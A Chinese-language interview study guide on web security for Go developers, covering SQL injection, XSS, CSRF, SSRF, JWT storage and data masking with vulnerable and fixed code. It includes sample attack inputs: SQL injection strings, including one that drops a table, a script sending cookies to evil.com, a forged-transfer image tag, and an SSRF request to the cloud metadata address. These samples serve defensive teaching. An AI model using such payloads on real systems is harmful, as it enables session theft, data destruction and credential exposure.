# Web 安全：常见攻击与防御

> 考察频率：★★★★☆  优先级：P1

---

## 1. 面试官考察意图

考察候选人是否有安全意识和防御思路。高级工程师不仅要写出功能代码，还要知道代码可能被怎么攻击、如何防御。这道题通常不要求背住所有攻击类型，而是考察：1）是否理解常见 Web 攻击的原理；2）是否有对应的防御手段；3）在 Go 生态中如何正确实现。

---

## 2. 核心答案（30秒版）

Web 安全四大天王：**SQL 注入**（参数化查询防御）、**XSS**（html/template 自动转义）、**CSRF**（Token + SameSite Cookie）、**SSRF**（URL 校验）。Go 的 `html/template` 默认转义，做到了 XSS 安全；`database/sql` 的占位符机制杜绝了 SQL 注入。但其他攻击需要开发者主动防御。

---

## 3. 深度展开

### 3.1 SQL 注入

#### 攻击原理

```go
// ❌ 危险：用户输入直接拼接到 SQL
userInput := r.FormValue("name")
query := fmt.Sprintf("SELECT * FROM users WHERE name='%s'", userInput)
// 如果输入是: ' OR '1'='1 → 变成全表查询
// 如果输入是: '; DROP TABLE users; -- → 删除整张表
```

#### 防御手段

```go
// ✅ 方式1：参数化查询（PrepareStatement）
stmt, err := db.Prepare("SELECT * FROM users WHERE name=? AND password=?")
if err != nil {
    log.Fatal(err)
}
defer stmt.Close()

// 参数会被安全转义，不会被当作 SQL 代码
row := stmt.QueryRow(username, password)

// ✅ 方式2：database/sql 的占位符
row := db.QueryRow("SELECT * FROM users WHERE name=? AND password=?", username, password)

// ✅ 方式3：ORM（gorm等）默认使用参数化查询
user := &User{}
db.Where("name = ? AND password = ?", username, password).First(user)
```

**重要**：Go 的 `database/sql` 占位符（`?`）会自动做参数绑定，永远不要拼接用户输入到 SQL 字符串中。

#### 生产注意点

```go
// ❌ ORDER BY 字段名无法用参数化查询
query := fmt.Sprintf("SELECT * FROM users ORDER BY %s", orderField) // 危险！

// ✅ 白名单校验
allowedFields := map[string]bool{"name": true, "created_at": true, "id": true}
if !allowedFields[orderField] {
    http.Error(w, "invalid field", 400)
    return
}
query := fmt.Sprintf("SELECT * FROM users ORDER BY %s", orderField)
```

---

### 3.2 XSS（跨站脚本攻击）

#### 攻击原理

```
攻击者在评论中提交：<script>document.location='http://evil.com/?c='+document.cookie</script>

当其他用户查看评论时：
1. 浏览器执行这段 JS
2. 攻击者拿到受害者的 Cookie
3. 劫持登录态
```

#### 防御手段

```go
// ✅ Go html/template 默认转义
import "html/template"

func handler(w http.ResponseWriter, r *http.Request) {
    comment := r.FormValue("comment")

    // html/template 会对所有变量自动 HTML 转义
    // < → &lt;  > → &gt;  " → &quot;  & → &amp;
    tmpl := template.Must(template.New("comment").Parse(`
        <div>{{.comment}}</div>
    `))
    tmpl.Execute(w, map[string]string{"comment": comment})
}
```

#### 三种 XSS 类型

| 类型 | 说明 | 防御 |
|------|------|------|
| **存储型** | 恶意内容存入DB，展示时执行 | 保持 html/template 自动转义 |
| **反射型** | 恶意内容通过 URL 参数反射 | 不要把 URL 参数直接输出到页面 |
| **DOM 型** | JS 直接操作 DOM，读取 URL | 前端：对 URL 参数手动转义 |

```go
// ❌ 反射型XSS：把URL参数直接输出
func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    fmt.Fprintf(w, "Hello, %s", name) // name 如果是 <script>，就执行了
}

// ✅ 正确：使用 html/template
tmpl := template.Must(template.New("").Parse("Hello, {{.name}}"))
tmpl.Execute(w, map[string]string{"name": name})
```

---

### 3.3 CSRF（跨站请求伪造）

#### 攻击原理

```
1. 受害者登录了银行网站 a.com，Cookie 有效
2. 攻击者诱导受害者访问 evil.com
3. evil.com 页面中有：<img src="http://a.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 a.com 的 Cookie，发起真实请求
5. 银行无法区分是用户操作还是被伪造的请求
```

#### 防御手段

```go
// ✅ 方式1：CSRF Token
type CSRFToken struct {
    Secret  string
    Token   string
}

func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

// 中间件：为所有 POST/PUT/DELETE 请求验证 Token
func csrfMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "GET" || r.Method == "HEAD" || r.Method == "OPTIONS" {
            // 读操作不验证
            next.ServeHTTP(w, r)
            return
        }

        token := r.Header.Get("X-CSRF-Token")
        sessionToken := getSession(r).CSRFToken

        if token == "" || token != sessionToken {
            http.Error(w, "csrf token invalid", 403)
            return
        }
        next.ServeHTTP(w, r)
    })
}

// 模板中输出 Token
tmpl := template.Must(template.New("form").Parse(`
    <form method="POST">
        <input type="hidden" name="csrf_token" value="{{.csrf_token}}">
        <!-- other fields -->
    </form>
`))
```

```go
// ✅ 方式2：SameSite Cookie（现代浏览器支持）
cookie := &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    SameSite: http.SameSiteStrictMode, // 完全禁止跨站发送
    HttpOnly: true, // JS 无法读取，防止 XSS 偷 Cookie
    Secure:   true, // HTTPS only
}
http.SetCookie(w, cookie)
```

| SameSite 值 | 行为 | 适用场景 |
|------------|------|---------|
| `Strict` | 任何跨站请求都不带 Cookie | 极高安全需求 |
| `Lax` | 导航请求（点击链接）可以带 Cookie | 大多数场景推荐 |
| `None` | 任何请求都带 Cookie（需 Secure=true） | 需要 iframe 内嵌等场景 |

---

### 3.4 SSRF（服务端请求伪造）

#### 攻击原理

```
攻击者构造请求：GET /fetch?url=http://169.254.169.254/latest/meta-data/

服务端代码：
url := r.FormValue("url")
resp, _ := http.Get(url) // 服务端发起请求，返回内网元数据

如果服务端在云环境（AWS/阿里云），攻击者就能拿到 IAM 角色的临时凭证
```

#### 防御手段

```go
// ✅ 方式1：URL 白名单校验
func isAllowedURL(rawURL string) bool {
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return false
    }

    // 只允许 http/https
    if parsed.Scheme != "http" && parsed.Scheme != "https" {
        return false
    }

    // 只允许指定域名
    allowedHosts := map[string]bool{
        "api.example.com": true,
        "cdn.example.com": true,
    }
    if !allowedHosts[parsed.Host] {
        return false
    }

    return true
}

// ✅ 方式2：解析后检查 IP，禁止内网地址
parsed, _ := url.Parse(rawURL)
ip := net.ParseIP(parsed.Hostname())
if ip == nil {
    // 可能是域名，先解析
    addrs, _ := net.LookupHost(parsed.Hostname())
    if len(addrs) > 0 {
        ip = net.ParseIP(addrs[0])
    }
}

privateBlocks := []*net.IPNet{
    {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
    {IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
    {IP: net.ParseIP("169.254.0.0"), Mask: net.CIDRMask(16, 32)}, // AWS 元数据地址段
}

for _, block := range privateBlocks {
    if block.Contains(ip) {
        return false // 拒绝内网地址
    }
}
```

---

### 3.5 JWT 安全

#### JWT 存储位置

| 存储位置 | 优点 | 风险 |
|---------|------|------|
| **LocalStorage** | 简单 | 易受 XSS 攻击，被 JS 读取 |
| **HttpOnly Cookie** | JS 无法读取，防 XSS | 易受 CSRF 攻击 |
| **Memory**（JS变量）| 防 XSS | 页面刷新丢失，需要重新登录 |

```go
// ✅ 推荐：HttpOnly Cookie + CSRF Token
cookie := &http.Cookie{
    Name:     "jwt",
    Value:    token,
    HttpOnly: true,  // JS 读不到
    SameSite: http.SameSiteStrictMode, // 防 CSRF
    Secure:   true,  // HTTPS only
    Path:     "/",
    MaxAge:   3600, // 1小时
}
http.SetCookie(w, cookie)
```

#### Token 泄露后的止损

```go
// 问题：JWT 的 secret 泄露了，攻击者可以伪造任意 Token

// ✅ 解决方案1：让旧 Token 失效（黑名单）
// 存一份 Token ID (jti claim) 的黑名单到 Redis
blacklist := map[string]bool{"token_jti_123": true}
if blacklist[tokenID] {
    return ErrTokenRevoked
}

// ✅ 解决方案2：缩短 Token 有效期 + 续期机制
// access_token 有效期 15 分钟
// refresh_token 有效期 7 天
// refresh_token 只用来申请新的 access_token，不带敏感操作

// ✅ 解决方案3：立即修改 Secret（但会导致所有用户 Token 失效）
// 用于重大泄漏事件
```

---

### 3.6 敏感数据处理

```go
// ✅ 密码：bcrypt 存储
import "golang.org/x/crypto/bcrypt"

func hashPassword(password string) (string, error) {
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    return string(bytes), err
}

func checkPassword(password, hash string) bool {
    return bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) == nil
}

// ✅ 手机号/身份证脱敏
func maskPhone(phone string) string {
    if len(phone) < 11 {
        return phone
    }
    return phone[:3] + "****" + phone[7:]
}

func maskIDCard(id string) string {
    if len(id) < 18 {
        return id
    }
    return id[:6] + "********" + id[14:]
}

// ✅ 日志中脱敏
func sensitiveLogger(kv ...interface{}) {
    for i := 0; i < len(kv); i += 2 {
        key := kv[i].(string)
        val := kv[i+1].(string)
        if isSensitiveField(key) {
            kv[i+1] = "***REDACTED***"
        }
    }
    log.Println(kv...)
}
```

---

## 4. 高频追问

### Q1：JWT 的 secret 泄露了怎么办？

> 分情况：1）如果泄漏范围可控（内部人员），立即修改 Secret 并审计日志，确认是否有异常 Token 使用。2）如果泄漏范围不可控（公开泄露），需要启动 Token 撤销机制，把所有旧 Token 标记为无效。3）预防措施：不要在前端存 Secret，用环境变量或 KMS 管理；定期轮换 Secret。

### Q2：XSS 和 CSRF 的区别？

> **XSS**：攻击目标是**用户浏览器**，通过注入恶意脚本获取用户数据（Cookie、Token）。攻击入口是**服务端返回的内容**。
> **CSRF**：攻击目标是**服务端**，通过利用用户的登录态让用户不知情地发起恶意操作。攻击入口是**用户的浏览器**（跨站请求）。
> 两者结合：XSS 偷 Token，CSRF 冒用身份。

### Q3：如何防止接口被人恶意爬取？

> 1）请求频率限制（rate limiting）；2）User-Agent / Referer 检查；3）验证码（CAPTCHA）；4）数据加密（关键字段加密后返回）；5）行为分析（同一 IP 频繁访问同一接口）。

---

## 5. 延伸阅读

- [OWASP Top 10 安全风险](https://owasp.org/www-project-top-ten/)
- [Go html/template 文档](https://pkg.go.dev/html/template)
- [JWT 安全最佳实践](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [CSRF 防御 - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
